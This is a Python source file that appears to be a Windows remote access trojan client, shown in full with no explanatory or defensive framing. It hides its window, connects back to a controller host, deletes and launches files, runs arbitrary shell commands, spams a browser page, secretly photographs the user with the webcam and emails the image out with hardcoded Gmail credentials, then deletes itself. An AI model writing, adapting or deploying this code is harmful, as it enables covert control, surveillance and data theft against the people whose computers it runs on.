import os
import socket
import time
from ecapture import ecapture as ec

import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from os import remove
from sys import argv

import win32gui, win32con

window = win32gui.GetForegroundWindow()
win32gui.ShowWindow(window, win32con.SW_MINIMIZE)


s = socket.socket()


host = str("IP OF HOST")
port = 8080

s.connect((host,port))


print("Connected to ", host)

fucker = True

counter = 0

while 1:
    command = s.recv(1024)
    command = command.decode()
    if command == "cd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())


    elif command == "dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())



    elif command == "del": 
        user_input2 = s.recv(5000)
        user_input2 = user_input2.decode()
        os.remove(user_input2)
        info = str("deleted!")
        s.send(info.encode())


    elif command == "start":
        user_input3 = s.recv(5000)
        user_input3 = user_input3.decode()
        os.startfile(user_input3)
        info2 = str("started!")
        s.send(info2.encode())
        


    elif command == "FUCKER":
        while fucker == True:
            os.system('cmd /c "start https://uk.pcmag.com/old-news/10521/what-to-do-when-youve-been-hacked"')
            time.sleep(5)
            counter += 1
            if counter == 5:
                fucker = False
                infoFUCKER = str("FINISHED!")
                s.send(infoFUCKER.encode())




    elif command == "cam":
        user_input4 = s.recv(5000)
        user_input4 = user_input4.decode()

        ec.capture(0,False,"img.jpg")


        subject = ""
        body = ""
        sender_email = "DuWurdestGeripped@gmail.com"
        receiver_email = user_input4
        password = "BBQ-12345678"

        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = subject
        message["Bcc"] = receiver_email


        message.attach(MIMEText(body, "plain"))


        filename = "img.jpg"



        with open(filename, "rb") as attachment:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())

    
        encoders.encode_base64(part)


        part.add_header(
            "Content-Disposition",
            f"attachment; filename= {filename}",
        )


        message.attach(part)
        text = message.as_string()




        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, text)


        os.remove("img.jpg")
        info3 = str("Send!")
        s.send(info3.encode())

    elif command == "cmd":
        user_input5 = s.recv(5000)
        user_input5 = user_input5.decode()
        os.system('cmd /c ' + user_input5)
        info3 = str("executed!")
        s.send(info3.encode())

    elif command == "exit":
        s.close()
        remove(argv[0])
        


    else:
        print("NOT FOUND!")

        

